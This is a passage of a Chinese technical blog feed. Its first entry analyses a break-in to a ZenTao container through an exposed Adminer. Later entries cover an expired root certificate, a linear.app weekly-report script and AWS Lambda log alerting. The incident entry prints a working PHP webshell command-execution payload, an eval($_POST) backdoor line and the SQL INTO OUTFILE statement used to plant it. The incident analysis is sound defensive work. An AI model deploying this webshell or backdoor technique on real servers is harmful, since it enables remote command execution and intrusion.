&quot;{$s}&quot;“;if(substr($d,0,1)&#x3D;&#x3D;”&#x2F;“){@putenv(“PATH&#x3D;”.getenv(“PATH”).”:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin”);}else{@putenv(“PATH&#x3D;”.getenv(“PATH”).”;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;”);}if(!empty($envstr)){$envarr&#x3D;explode(“|||asline|||”, $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace(“|||askey|||”, “&#x3D;”, $v));}}}$r&#x3D;”{$p} {$c}”;function fe($f){$d&#x3D;explode(“,”,@ini_get(“disable_functions”));if(empty($d)){$d&#x3D;array();}else{$d&#x3D;array_map(‘trim’,array_map(‘strtolower’,$d));}return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) &#x3D;&#x3D; “&#x2F;“ &amp;&amp; fe(‘putenv’) &amp;&amp; (fe(‘error_log’) || fe(‘mail’))) {if (strstr(readlink(“&#x2F;bin&#x2F;sh”), “bash”) !&#x3D; FALSE) {$tmp &#x3D; tempnam(sys_get_temp_dir(), ‘as’);putenv(“PHP_LOL&#x3D;() { x; }; $c &gt;$tmp 2&gt;&amp;1”);if (fe(‘error_log’)) {error_log(“a”, 1);} else {mail(“&#97;&#64;&#49;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;“, “”, “”, “-bv”);}} else {return False;}$output &#x3D; @file_get_contents($tmp);@unlink($tmp);if ($output !&#x3D; “”) {print($output);return True;}}return False;};function runcmd($c){$ret&#x3D;0;$d&#x3D;dirname($_SERVER[“SCRIPT_FILENAME”]);if(fe(‘system’)){@system($c,$ret);}elseif(fe(‘passthru’)){@passthru($c,$ret);}elseif(fe(‘shell_exec’)){print(@shell_exec($c));}elseif(fe(‘exec’)){@exec($c,$o,$ret);print(join(““,$o));}elseif(fe(‘popen’)){$fp&#x3D;@popen($c,’r’);while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe(‘proc_open’)){$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(‘pipe’, ‘w’), 2 &#x3D;&gt; array(‘pipe’, ‘w’)), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe(‘antsystem’)){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!&#x3D;”&#x2F;“ &amp;&amp; @class_exists(“COM”)){$w&#x3D;new COM(‘WScript.shell’);$e&#x3D;$w-&gt;exec($c);$so&#x3D;$e-&gt;StdOut();$ret.&#x3D;$so-&gt;ReadAll();$se&#x3D;$e-&gt;StdErr();$ret.&#x3D;$se-&gt;ReadAll();print($ret);}else{$ret &#x3D; 127;}return $ret;};$ret&#x3D;@runcmd($r.” 2&gt;&amp;1”);print ($ret!&#x3D;0)?”ret&#x3D;{$ret}”:””;;}catch(Exception $e){echo “ERROR:&#x2F;&#x2F;“.$e-&gt;getMessage();};asoutput();die();

把 php 代码格式化后，得到：
@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir=@ini_get(&quot;open_basedir&quot;);if($opdir) &#123;	$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);	$oparr=preg_split(base64_decode(&quot;Lzt8Oi8=&quot;),$opdir);	@array_push($oparr,$ocwd,sys_get_temp_dir());	foreach($oparr as $item) &#123;		if(!@is_writable($item))&#123;			continue;		&#125;;		$tmdir=$item.&quot;/.dd4073a3309&quot;;		@mkdir($tmdir);		if(!@file_exists($tmdir))&#123;			continue;		&#125;		$tmdir=realpath($tmdir);		@chdir($tmdir);		@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);		$cntarr=@preg_split(&quot;/\\\\|\//&quot;,$tmdir);		for($i=0;$i&lt;sizeof($cntarr);$i++)&#123;			@chdir(&quot;..&quot;);		&#125;;		@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);		@rmdir($tmdir);		break;	&#125;;&#125;;;function asenc($out)&#123;	return @base64_encode($out);&#125;;function asoutput()&#123;	$output=ob_get_contents();	ob_end_clean();	echo &quot;67&quot;.&quot;035&quot;;	echo @asenc($output);	echo &quot;031&quot;.&quot;531&quot;;&#125;ob_start();try&#123;	$p=base64_decode(substr($_POST[&quot;h82ad1117a8e69&quot;],2));	$s=base64_decode(substr($_POST[&quot;h51d3ad7f0190a&quot;],2));	$envstr=@base64_decode(substr($_POST[&quot;pb5f3a839543ad&quot;],2));	$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);	$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;&#123;		$s	&#125;		\&quot;&quot;:&quot;/c \&quot;&#123;			$s		&#125;\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;)&#123;	@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);&#125;else&#123;	@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);&#125;if(!empty($envstr))&#123;	$envarr=explode(&quot;|||asline|||&quot;, $envstr);	foreach($envarr as $v) &#123;		if (!empty($v)) &#123;			@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));		&#125;	&#125;&#125;$r=&quot;&#123;		$p&#125;	 &#123;		$c&#125;	&quot;;function fe($f)&#123;	$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));	if(empty($d))&#123;		$d=array();	&#125;else&#123;		$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));	&#125;	return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));&#125;;function runshellshock($d, $c) &#123;	if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;		if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;			$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);			putenv(&quot;PHP_LOL=() &#123;x;&#125;;$c &gt;$tmp 2&gt;&amp;1&quot;);			if (fe(&#x27;error_log&#x27;)) &#123;				error_log(&quot;a&quot;, 1);			&#125; else &#123;				mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);			&#125;		&#125; else &#123;			return False;		&#125;		$output = @file_get_contents($tmp);		@unlink($tmp);		if ($output != &quot;&quot;) &#123;			print($output);			return True;		&#125;	&#125;	return False;&#125;;function runcmd($c)&#123;	$ret=0;	$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);	if(fe(&#x27;system&#x27;))&#123;		@system($c,$ret);	&#125;elseif(fe(&#x27;passthru&#x27;))&#123;		@passthru($c,$ret);	&#125;elseif(fe(&#x27;shell_exec&#x27;))&#123;		print(@shell_exec($c));	&#125;elseif(fe(&#x27;exec&#x27;))&#123;		@exec($c,$o,$ret);		print(join(&quot;&quot;,$o));	&#125;elseif(fe(&#x27;popen&#x27;))&#123;		$fp=@popen($c,&#x27;r&#x27;);		while(!@feof($fp))&#123;			print(@fgets($fp,2048));		&#125;		@pclose($fp);	&#125;elseif(fe(&#x27;proc_open&#x27;))&#123;		$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);		while(!@feof($io[1]))&#123;			print(@fgets($io[1],2048));		&#125;		while(!@feof($io[2]))&#123;			print(@fgets($io[2],2048));		&#125;		@fclose($io[1]);		@fclose($io[2]);		@proc_close($p);	&#125;elseif(fe(&#x27;antsystem&#x27;))&#123;		@antsystem($c);	&#125;elseif(runshellshock($d, $c)) &#123;		return $ret;	&#125;elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;))&#123;		$w=new COM(&#x27;WScript.shell&#x27;);		$e=$w-&gt;exec($c);		$so=$e-&gt;StdOut();		$ret.=$so-&gt;ReadAll();		$se=$e-&gt;StdErr();		$ret.=$se-&gt;ReadAll();		print($ret);	&#125;else&#123;		$ret = 127;	&#125;	return $ret;&#125;;$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);print ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;;&#125;catch(Exception $e)&#123;	echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();

找到一个后门：/apps/zentao/config/config.php，权限 777,最后一句：
@eval($_POST[&#x27;nasik1&#x27;]);

执行 stat config/config.php，输出：

 File: config&#x2F;config.php  Size: 16600     	Blocks: 40         IO Block: 4096   regular fileDevice: 5eh&#x2F;94d	Inode: 2374867     Links: 1Access: (0777&#x2F;-rwxrwxrwx)  Uid: (65534&#x2F;  nobody)   Gid: (65534&#x2F; nogroup)Access: 2025-05-13 12:51:49.652000000 +0800Modify: 2025-04-16 13:08:56.368000000 +0800Change: 2025-04-16 13:08:56.368000000 +0800 Birth: 2025-02-19 14:01:10.416000000 +0800

继续漏洞分析这个版本的禅道自带 adminer(版本 4.8.2-dev)，这个是我到代码目录下才看见的。我找了找 adminer 的漏洞，很容易就找到一个，但是这个漏洞的利用必须得先要

有能登录数据库的账号密码
这个数据库账号还需要有 FILE 权限

而恰好，当时跑 zentao 之后第一次安装时，数据库设置选的缺省的账号密码，本来缺省的也没事，毕竟数据库只能本地连，但 adminer 一下子又让 web 可以访问，于是，web 也就能连数据库了，再加上还是缺省账号密码，于是就能 web 登录数据库了，然后缺省账号密码权限还很高，于是直接就能写后门了。
至于前面看到的 /apps/zentao/config/config.php 里最后的一句：
@eval($_POST[&#x27;nasik1&#x27;]);

都是在 adminer 中登录数据库以后，执行 sql 语句：
SELECT &quot;@eval(\$_POST[&#x27;nasik1&#x27;]);&quot; INTO OUTFILE &#x27;/apps/zentao/config/config.php&#x27;
生成的。
在 zentao 的日志里发现了关键几句：
192.168.0.1 - - [15/Apr/2025:15:58:43 +0800] &quot;POST /adminer/index.php HTTP/1.0&quot; 302 - &quot;https://api-devnet.chainless.top:8002/adminer/index.php&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot;192.168.0.1 - - [15/Apr/2025:15:58:44 +0800] &quot;GET /adminer/index.php?username=root&amp;db=zentao HTTP/1.0&quot; 403 4673 &quot;https://api-devnet.chainless.top:8002/adminer/index.php&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot;192.168.0.1 - - [15/Apr/2025:15:58:44 +0800] &quot;GET /adminer/index.php?file=functions.js&amp;version=4.8.2-dev HTTP/1.0&quot; 200 27548 &quot;https://api-devnet.chainless.top:8002/adminer/index.php?username=root&amp;db=zentao&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot;192.168.0.1 - - [15/Apr/2025:15:58:45 +0800] &quot;GET /adminer/index.php?file=favicon.ico&amp;version=4.8.2-dev HTTP/1.0&quot; 200 318 &quot;https://api-devnet.chainless.top:8002/adminer/index.php?username=root&amp;db=zentao&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot;

由上可以看出，黑客是 15/Apr/2025:15:58:44 +0800 开始进来的。但是前面看 /apps/zentao/config/config.php 是 16/Apr/2025 被植入后门的。但我在那个时间没有抓到有力证据有写入 config.php 的操作。 
后续操作另外用禅道官方最新的 image easysoft/zentao:21.6 和之前的持久化的数据，删了些东西，重建了一个容器：zentao，publish 到 8001 端口，现在用宿主机的 内网 IP 可以访问。
随后会创建网络 ACL，据掉从 192.168.0.0&#x2F;23（PVE） 到 192.168.2.0&#x2F;23（深圳办公室） 的主动访问请求。
异常文件分析以下为容器内 /tmp 目录下的关键异常文件：

**/tmp/phpx2lUxr**：

MD5：0a525dab9878c80373399c1ed0f7b8d6
创建时间：2025年4月23指的是什么？4月23日
分析：文件内容为base64编码字符串，解码后疑似为加密的恶意脚本或payload。由于文件过大，未直接包含在报告中。初步分析表明其可能为攻击者植入的加密后门或下载器，用于动态加载其他恶意代码。
作用：可能作为初始植入点或后续恶意代码的加载器。


**/tmp/.1/ns**：

MD5：dd1c4358c778d3f1161266fa0d81e8cc
描述：位于隐藏目录 /tmp/.1 中，可执行二进制文件，负责C2通信。


**/tmp/slix**：

MD5：cbd49e364bac69eb77813435e5c18365
描述：可执行文件，负责协调网络扫描和脚本执行。


其他文件：

/tmp/fs：网络扫描工具，配合 scanb.sh 使用。
/tmp/rustscan：快速端口扫描工具。
/tmp/cdk_linux_386：疑似漏洞利用或恶意二进制文件。
/tmp/.32915ant_x64.so、/tmp/gconv-modules：可能的恶意动态库。
/tmp/adminer.invalid、/tmp/adminer.version：与Adminer数据库管理工具相关，暗示可能的web攻击向量。
/tmp/CVE-2021-22555-Exploit：目录名指向Linux内核提权漏洞（CVE-2021-22555），表明攻击者尝试提权。



攻击者基础设施
IP地址：176.32.35.190
归属：俄罗斯，BX-NETWORK（AS51659），托管商Baxet.ru，滥用联系邮箱 noc@baxet.ru。
作用：C2服务器，接收 ns 进程的通信，控制恶意活动。
证据：网络流量分析显示 176.32.35.190:8024 为主要外部通信目标，ns 进程的 -vkey=82yukro912ktndfc 参数表明存在身份验证机制。

入侵时间线
**2025 年 4 月 15 日：应该就被入侵（通过 adminer 进来了）
2025年4月15–23日：恶意文件（slix、ns、phpx2lUxr 等）陆续出现，slix 进程最早于4月17日启动，表明入侵可能发生于4月中旬。
2025年4月23日：ns 进程启动，与C2服务器建立连接。
2025年5月6日：检测到PVE香港出口带宽异常，初步定位为 176.32.35.190:8024 的流量。
2025年5月7日：通过 pstree -a 确认容器内存在异常进程，正式确认入侵。

可能攻击向量
ZenTao漏洞：easysoft/zentao:21.4 或其Adminer组件可能存在远程代码执行（RCE）、文件上传或其他web漏洞，导致初始访问。
Web暴露：容器通过PVE主机的Nginx代理暴露端口 8002，若未配置强认证或WAF，可能被外部直接攻击。
提权尝试：/tmp/CVE-2021-22555-Exploit 表明攻击者尝试利用Linux内核漏洞提权，但 docker inspect 显示容器非特权模式（&quot;Privileged&quot;: false），限制了提权影响。
用户权限：恶意进程以 nobody 用户运行，与ZenTao的Apache默认用户一致，暗示攻击通过web漏洞获得容器内执行权限。

事件影响
容器妥协：zentao 容器完全被入侵，运行恶意进程并与C2服务器通信。
网络扫描：攻击者扫描内网网段 192.168.0.0/16 和 172.24.0.0/16，可能收集了网络拓扑或其他设备信息。
数据泄露风险：ns 进程与C2服务器的通信，可能导致敏感数据（如ZenTao数据库内容）外泄或接收恶意指令。
主机安全：暂无证据显示PVE主机或其他虚拟机受损，但内网扫描行为增加了横向移动风险。

结论zentao 容器于2025年4月中旬通过可能的web漏洞被入侵，攻击者植入恶意文件（slix、ns、phpx2lUxr 等），执行网络扫描和C2通信。入侵持续约20天，直至2025年5月6日因带宽异常暴露。应急隔离措施已生效，建议进一步分析日志、恶意文件，重建干净的ZenTao服务，并检查内网其他系统是否受影响。
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>zentao</tag>
        <tag>adminer</tag>
        <tag>phpx2lUxr</tag>
      </tags>
  </entry>
  <entry>
    <title>踩坑：根证书过期</title>
    <url>/2021/02/%E8%B8%A9%E5%9D%91%E6%A0%B9%E8%AF%81%E4%B9%A6%E8%BF%87%E6%9C%9F/index.html</url>
    <content><![CDATA[缘起有人说：

职能团队不能说“不”（There is no “NO”.）。

意思是需求方提出的不管是什么需求，都要有解决方案。这不，公司由于业务需要，某些个团队有科学上网的需求（其实技术团队也有），提到运维这里了，我没法说搞不定呀，于是只能吭哧吭哧想办法解决，最早一版我自己用了好几年的方案被毙，理由是不要用，太复杂（其实也没有被毙，技术团队大多在用这个方案）。于是我就有整了个简单好用的方案，这几天正忙着方案落地呢。
在服务器上安装软件的时候，发现了这个问题。


问题详情两台 Amazon Linux 2 的服务器，在我用 rpm 命令加 url 方式安装软件的时候，一台成功，一台出错。
仔细查，出错的那台是因为 https://download.libreswan.org/ 的证书过期。但为什么另外一台又没有问题呢？继续查：
openssl s_client \	-showcerts \	-connect download.libreswan.org:443

两台机器上分别执行上面的这个脚本，结果发现：
出错的那一台报（以下是部分输出）：

depth&#x3D;3 O &#x3D; Digital Signature Trust Co., CN &#x3D; DST Root CA X3verify error:num&#x3D;10:certificate has expirednotAfter&#x3D;Sep 30 14:01:15 2021 GMT

好的那一台却报的是（以下是部分输出）：

depth&#x3D;2 C &#x3D; US, O &#x3D; Internet Security Research Group, CN &#x3D; ISRG Root X1verify return:1depth&#x3D;1 C &#x3D; US, O &#x3D; Let’s Encrypt, CN &#x3D; R3verify return:1depth&#x3D;0 CN &#x3D; libreswan.orgverify return:1

从看到的证书链上来看：

证书 “CN&#x3D;libreswan.org” 是“C&#x3D;US&#x2F;O&#x3D;Let’s Encrypt&#x2F;CN&#x3D;R3” 签发的
而 “C&#x3D;US&#x2F;O&#x3D;Let’s Encrypt&#x2F;CN&#x3D;R3”是“C&#x3D;US&#x2F;O&#x3D;Internet Security Research Group&#x2F;CN&#x3D;ISRG Root X1”签发的
“C&#x3D;US&#x2F;O&#x3D;Internet Security Research Group&#x2F;CN&#x3D;ISRG Root X1”是“O&#x3D;Digital Signature Trust Co.&#x2F;CN&#x3D;DST Root CA X3”签发的

而过期的正是这个“DST Root CA X3”证书。
原因所在最后发现两台机器的区别在哪里？在于软件包 ca-certificates 版本不一样，这个正是放系统自带信任的 CA 证书的软件包。其中报错的那台，ca-certificates 有“DST Root CA X3”这个证书；而不报错的那台 ca-certificates 里没有“DST Root CA X3”这个证书。
解决方案问题解决也简单，报错的那台升级下 ca-certificates 即可：
yum -y update ca-certificates

思考其实在两个不同版本的 ca-certificates 里，“ISRG Root X1”都在信任的根证书列表里面，为什么信任的根证书列表里有“DST Root CA X3”会出错呢？
附录其实这些，AWS 官方早有文档说法，参见链接：

https://aws.amazon.com/premiumsupport/knowledge-center/ec2-expired-certificate/
https://aws.amazon.com/amazon-linux-2/release-notes/

]]></content>
      <tags>
        <tag>Amazon Linux 2</tag>
        <tag>ISRG Root X1</tag>
        <tag>curl</tag>
        <tag>DST Root CA X3</tag>
        <tag>SSL Certificate</tag>
        <tag>expired</tag>
        <tag>openssl</tag>
        <tag>ca-certificates</tag>
      </tags>
  </entry>
  <entry>
    <title>通过 API 抓取 linear.app 的任务生成周报</title>
    <url>/2023/04/%E9%80%9A%E8%BF%87%20API%20%E6%8A%93%E5%8F%96%20linear.app%20%E7%9A%84%E4%BB%BB%E5%8A%A1%E7%94%9F%E6%88%90%E5%91%A8%E6%8A%A5/index.html</url>
    <content><![CDATA[背景某个项目用了 linear.app 来做任务分配和跟踪，为了写周报，想利用 API 来自动获取任务信息。


准备工作获取 API 密钥在 linear.app 里，点击自己的头像-&gt;Settings，点击左边导航栏的 API，在右边页面的 Personal API keys 下面 Create key 一下，然后记住。
安装 SDKlinear.app 的官方的 SDK 是 TypeScript 写的，但实际上 JavaScript 也是兼容的吧。官方给的安装 SDK 的命令就是下面这个：
npm install @linear/sdk# 安装 SDK

GraphQL 介绍linear.app 的公开的 API 都是用 GraphQL 搭建的，官方也建议用 GraphQL 来获取数据
实现代码前方高能预警：调包侠再次上线！
核心实现代码：
import &#123; LinearClient &#125; from &#x27;@linear/sdk&#x27;// 用你的linear.app API密钥替换这里的YOUR_API_KEYconst apiKey = &#x27;lin_api_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;;const linearClient = new LinearClient(&#123; apiKey &#125;);const graphQLClient = linearClient.client;// 定义一个GraphQL查询来获取上一周完成的工作列表const queryLastWeekWork = `  query GetLastWeekWork($startDate: DateTime, $endDate: DateTime) &#123;    viewer &#123;        assignedIssues(filter: &#123;            state: &#123; type: &#123; eq: &quot;completed&quot; &#125; &#125;            completedAt: &#123;                gte: $startDate                lte: $endDate            &#125;        &#125;) &#123;            nodes &#123;                id                title                completedAt                url                creator &#123; id &#125;                assignee &#123; id &#125;            &#125;        &#125;    &#125;  &#125;`;// 定义一个函数来获取上周的日期范围function getLastWeekDates() &#123;  const today = new Date();  const lastWeekStart = new Date(today);  lastWeekStart.setDate(today.getDate() - 7);  const lastWeekEnd = new Date(today);  lastWeekEnd.setDate(today.getDate());  return &#123; startDate: lastWeekStart.toISOString(), endDate: lastWeekEnd.toISOString() &#125;;&#125;// 执行查询并生成工作周报async function generateWeeklyReport() &#123;  try &#123;    const &#123; startDate, endDate &#125; = getLastWeekDates(); // 调用函数获取上周日期范围    const response = await graphQLClient.rawRequest(queryLastWeekWork);    const tasks = response.data.viewer.assignedIssues.nodes;    console.log(&#x27;工作周报：\n&#x27;);    tasks.forEach((task) =&gt; &#123;      console.log(`- [$&#123;task.title&#125;]($&#123;task.url&#125;) 完成于 $&#123;task.completedAt&#125;`);    &#125;);  &#125; catch (error) &#123;    console.error(&#x27;生成工作周报时出错：&#x27;, error);  &#125; finally &#123;  &#125;&#125;

把以上代码存为文件：linear.js，再用 Node.Js 来跑一下：
node linear.js

周报出炉！
]]></content>
      <tags>
        <tag>linear.app</tag>
        <tag>SDK</tag>
        <tag>TypeScript</tag>
        <tag>JavaScript</tag>
        <tag>Node.Js</tag>
        <tag>GraphQL</tag>
      </tags>
  </entry>
  <entry>
    <title>通过实时监控日志里的敏感信息来实现对应用的监控报警</title>
    <url>/2023/11/%E9%80%9A%E8%BF%87%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%E6%97%A5%E5%BF%97%E9%87%8C%E7%9A%84%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%9D%A5%E5%AE%9E%E7%8E%B0%E5%AF%B9%E5%BA%94%E7%94%A8%E7%9A%84%E7%9B%91%E6%8E%A7%E6%8A%A5%E8%AD%A6/index.html</url>
    <content><![CDATA[背景项目有一些非常重要的后台应用是跑在 AWS 的 lambda 上的，老板和产品非常关注这些应用的执行情况，一旦出错，都会是很严重的故障。
方案变迁前面做过一些基础设施级别的监控报警，如：监控 AWS 的 RDS 并通过企业微信来报警，那个完全是利用基础设施自动打到 CloudWatch 的基础的 metrics 来做的。
于是，我这里下意识的就想利用现有的 CloudWatch 里现成的 Metrics 来做这个事情，于是我就弄了三个（种）监控：



利用官方文档 里提到的 lambda 的 Errors 这个基础 Metric 做了一个
利用官方文档 里提到的 API Gateway 的基础 Metrics: 4XXError 和 5XXError 做了一个（其实是两个，4XX、5XX 各一个）
然后又用给 lambda function 的日志新建 metric filter 的方法，新建了一个 metric，用来统计日志里敏感信息信息的次数，最后在 CloudWatch 里用这个新建的 metric 来做的报警

用这三种方案有一个好处，就是可以沿用之前已有的监控 AWS 的 RDS 并通过企业微信来报警里的 CloudWatch-&gt;SNS-&gt;Lambda function 这种现成的框架。
但等做完了，测试过报警信息了，才发现这三种方案都有一个共同的缺点：这三种都是基于 metrics 来做的报警，但是 metrics 其实只关注 metrics 的数量，报警依赖的是数量跟阈值的比较，报出来的上下文信息也只能是老状态是啥、新状态是啥；为什么触发报警（metric 次数超过阈值什么的），完完全全不能带出原始日志里的信息。所以，往往关心出错具体信息的技术收到报警以后也会一头雾水，完全不知道哪里出错。
所以，改方案了，在重要的 lambda function 的日志里，新建一个 Lambda subscribtion filter，设置当在日志里发现敏感信息后，触发一个 Lambda function: A。在这个名叫 A 的 Lambda function 里，实现报警的功能。这个方案神似当年我们在实体机时代通过 tail -f xxxx.log | grep &quot;xxxx&quot; | /path/to/a.py 来检测重要程序的日志里的关键词“xxxx”来报警的套路。
具体步骤编写 Lambda function名叫 “A” 的报警 Lambda function 的代码如下：
import jsonimport osimport gzipimport base64import http.clientimport urllib.parseWEBHOOK_TOKEN = os.environ[&#x27;WX_TOKEN&#x27;]  # 你的企业微信 Webhook TokenWEBHOOK_URL = &quot;qyapi.weixin.qq.com&quot;def send_to_wechat_work(account_id, region_name, log_group_name, log_stream_name, message):    # URL编码日志组和日志流名称    log_group_encoded = urllib.parse.quote(log_group_name, safe=&#x27;&#x27;)    log_stream_encoded = urllib.parse.quote(log_stream_name, safe=&#x27;&#x27;)    # 构造CloudWatch日志链接    log_url = f&quot;https://console.aws.amazon.com/cloudwatch/home?region=&#123;region_name&#125;#logsV2:log-groups/log-group/&#123;log_group_encoded&#125;/log-events/&#123;log_stream_encoded&#125;&quot;    # 创建企业微信消息格式    wechat_msg = &#123;        &quot;msgtype&quot;: &quot;markdown&quot;,        &quot;markdown&quot;: &#123;            &quot;content&quot;: f&quot;#### :rotating_light: Lambda Error Alert :rotating_light:\n&quot;                       f&quot;**Account ID:**&#123;account_id&#125;\n\n&quot;                       f&quot;**Log Group:**&#123;log_group_name&#125;\n\n&quot;                       f&quot;**Log Stream:**&#123;log_stream_name&#125;\n\n&quot;                       f&quot;**Message:**\n\n&quot;                       f&quot;```\n&#123;message&#125;\n```\n\n&quot;  # Markdown code block                       f&quot;[Click here to view the log](&#123;log_url&#125;)&quot;        &#125;    &#125;    # 发送POST请求至企业微信    conn = http.client.HTTPSConnection(WEBHOOK_URL)    headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;    body = json.dumps(wechat_msg)    conn.request(&quot;POST&quot;, f&quot;/cgi-bin/webhook/send?key=&#123;WEBHOOK_TOKEN&#125;&quot;, body, headers)    response = conn.getresponse()    data = response.read()    conn.close()    return datadef lambda_handler(event, context):    try:        # 解压缩日志数据        log_data = base64.b64decode(event[&#x27;awslogs&#x27;][&#x27;data&#x27;])        uncompressed_data = gzip.decompress(log_data)        log_events_data = json.loads(uncompressed_data)    except Exception as e:        print(f&quot;Error processing log data: &#123;str(e)&#125;&quot;)        return &#123;&#x27;statusCode&#x27;: 500, &#x27;body&#x27;: json.dumps(&#x27;Error processing log data&#x27;)&#125;    # 获取日志组和流信息，并提取账户 ID 和区域(region)名    log_group_name = log_events_data.get(&#x27;logGroup&#x27;, &#x27;Unknown log group&#x27;)    log_stream_name = log_events_data.get(&#x27;logStream&#x27;, &#x27;Unknown log stream&#x27;)    account_id = context.invoked_function_arn.split(&quot;:&quot;)[4]    region_name = context.invoked_function_arn.split(&quot;:&quot;)[3]        # 过滤并发送每个有效的日志消息    messages_sent = 0    for log_event in log_events_data.get(&#x27;logEvents&#x27;, []):        message = log_event.get(&#x27;message&#x27;).strip()        if message:  # 检查消息不是空的或者只包含空白字符            print(&quot;message:&quot;, message)            send_to_wechat_work(account_id, region_name, log_group_name, log_stream_name, message)            messages_sent += 1    if messages_sent == 0:        print(&quot;No valid log events to send.&quot;)    return &#123;&#x27;statusCode&#x27;: 200, &#x27;body&#x27;: json.dumps(&#x27;Messages sent to WeChat Work&#x27;)&#125;

建立 Lambda subscribtion filter 并指向上一步创建的 Lambda function在 Lambda 的页面里，找到需要监控报警的那个“重要”的后台应用：”B”，点击进入 “B” 的页面，点击 “Configration” 这个 tab，然后在左侧栏里点击 “Monitoring and operations tools”，这时，在中间栏的 “Logging configuration” 部分就能看到 “CloudWatch log group” 了，大概是像这样：“&#x2F;aws&#x2F;lambda&#x2F;B”，同时这也还是一个链接，直接点击就会到 B 在 CloudWatch 里的 Log group 了。
在这个具体的 Log group 的页面里，点击 “Subscription filters” 这个 tab，点击右侧叫 “Create” 的下拉按钮，在弹出来的菜单里点击 “Create Lambda subscription filter”，然后

在 “Lambda function” 里选择之前的那个叫 “A” 的 Lambda function
“Subscription filter pattern” 里填上匹配日志的信息，比如我用的是“%xxxx%”
“Subscription filter name” 随便写

然后，点击右下按钮 “Start streaming” 就可以了。
总结都很简单是吧，的确很简单。但是没用过 AWS 或对 AWS 不熟悉的人来说，估计是想不到 AWS 还有这些“奇奇怪怪”的功能的。顺便说一个冷知识，在 AWS 的 Serverless Application Repository 这个服务下的 Available applications 里，有个叫 “WeChat-Notifier” 的应用，直接可以用来做报警！直接支持微信和企业微信。所以呀，其实就报警到（企业）微信这事儿，原本都不用写代码的，直接调用这个就好了！下次有时间再写写关于 “WeChat-Notifier” 的内容。
]]></content>
      <tags>
        <tag>AWS</tag>
        <tag>python</tag>
        <tag>企业微信</tag>
        <tag>lambda</tag>
        <tag>cloudwatch</tag>
        <tag>log group</tag>
        <tag>log stream</tag>
        <tag>WeChat-Notifier</tag>
      </tags>
  </entry>
  <entry>
    <title>问运维团队 leader 的一些（技术）问题</title>
    <url>/2021/06/%E9%97%AE%E8%BF%90%E7%BB%B4%E5%9B%A2%E9%98%9F%20leader%20%E7%9A%84%E4%B8%80%E4%BA%9B%EF%BC%88%E6%8A%80%E6%9C%AF%EF%BC%89%E9%97%AE%E9%A2%98/index.html</url>
